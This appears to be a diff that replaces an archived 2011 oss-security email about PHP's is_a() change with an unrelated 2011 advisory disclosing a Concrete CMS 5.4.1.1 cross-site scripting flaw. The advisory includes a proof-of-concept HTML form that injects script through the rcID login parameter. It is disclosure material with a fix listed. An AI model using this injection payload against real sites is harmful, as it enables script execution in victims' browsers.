@@ -1,40 +1,89 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/09/25/3
-Message-ID: <4E7EECDB.6080106@sugarcrm.com>
-Date: Sun, 25 Sep 2011 01:56:59 -0700
-From: Stas Malyshev <smalyshev@...arcrm.com>
-To: Pierre Joye <pierre.php@...il.com>
-CC: Vincent Danen <vdanen@...hat.com>,  "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>, "security@....net" <security@....net>
-Subject: Re: CVE request: is_a() function may allow arbitrary code execution in PHP 5.3.7/5.3.8
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/08/22/8
+Message-ID: <CAPYM6Vzyvf01NTiQvV17ed0vwcH8LhKgt+SoEXq-0X2rf=-zdw@mail.gmail.com>
+Date: Tue, 23 Aug 2011 01:45:57 +0800
+From: YGN Ethical Hacker Group <lists@...g.net>
+To: oss-security@...ts.openwall.com
+Subject: CVE Request: Concrete CMS 5.4.1.1 <= Cross Site Scripting
 Content-Type: text/plain; charset=utf-8
 
-Hi!
+Concrete CMS 5.4.1.1  <=  Cross Site Scripting
 
-On 9/25/11 1:28 AM, Pierre Joye wrote:
-> It breaks the checks which leads to autoloader to accept bad input.
-> Yes, the autoloader should have sanity check in place but this BC
-> break changes the behavior and introduced this issue as well on top of
-> it.
->
-> I'm not sure either if we need a CVE as it is not a flaw in php itself
-> per se. However the BC break introduces flaws in working codes, and
-> that's a gray zone now.
 
-Yes, it is a behavior change, and it shouldn't have happened in 5.3, the 
-fact that it happened was a bad mistake, it is clear now.
-However, the security flaw is squarely in the code that a) misuses is_a 
-b) doesn't have security checks and c) does not follow recommended best 
-practices about PHP settings.
-As such, telling people that it was a flaw in PHP and that BC break 
-reversal "fixed" it only gives them wrong ideas that their code was just 
-fine. But in fact their code was broken and only by luck (and due to the 
-haphazard way things were done in PHP where nobody bothered correlating 
-function signatures with one another) in might have not been 
-malfunctioning in this specific scenario. They need to fix that code 
-ASAP, as they can not rely on luck anymore and they way is_a was changed 
-is actually they way it should have worked from the start and the way 
-is_subclass_of works right now.
--- 
-Stanislav Malyshev, Software Architect
-SugarCRM: http://www.sugarcrm.com/
-(408)454-6900 ext. 227
+1. OVERVIEW
+
+Concrete CMS 5.4.1.1  and lower versions are vulnerable to Cross Site Scripting.
+
+
+2. BACKGROUND
+
+Concrete5 makes running a website easy. Go to any page in your site,
+and a editing toolbar gives you all the controls you need to update
+your website. No intimidating manuals, no complicated administration
+interfaces - just point and click.
+
+
+3. VULNERABILITY DESCRIPTION
+
+The rcID parameter is not properly sanitized, which allows attacker to
+conduct Cross Site Scripting attack. This may allow an attacker to
+create a specially crafted URL that would execute arbitrary script
+code in a victim's browser.
+
+
+4. VERSIONS AFFECTED
+
+CMS 5.4.1.1  <=
+
+
+5. PROOF-OF-CONCEPT/EXPLOIT
+
+
+vulnerable parameter: rcID
+
+<form action="http://[target]/Concrete/index.php/login/do_login/"
+method="post">
+<input type="hidden" name="uName" value="test" />
+<input type="hidden" name="uPassword" value="test" />
+<input type="hidden" name="rcID" value='"
+style=display:block;color:red;width:9999;height:9999;z-index:9999;top:0;left:0;background-image:url(javascript:alert(/XSS/));width:expression(alert(/XSS/));
+onmouseover="alert(/XSS/)' />
+<input type="submit" name="submit" value="Get Concrete CMS 5.4.1.1 XSS" />
+</form>
+
+
+6. SOLUTION
+
+Upgrade to 5.4.2 or higher.
+
+
+7. VENDOR
+
+Concrete CMS Developers
+http://www.concrete5.org/
+
+
+8. CREDIT
+
+This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
+Ethical Hacker Group, Myanmar.
+
+
+9. DISCLOSURE TIME-LINE
+
+2011-04-14: vulnerability reported
+2011-08-04: vendor released fixed version
+2011-08-23: vulnerability disclosed
+
+
+10. REFERENCES
+
+Original Advisory URL:
+http://yehg.net/lab/pr0js/advisories/[concrete_5.4.1.1]_cross_site_scripting
+Project Home: http://www.concrete5.org/
+Vendor Release Note:
+http://www.concrete5.org/documentation/background/version_history/5-4-2-release-notes/
+
+
+
+#yehg [2011-08-23]
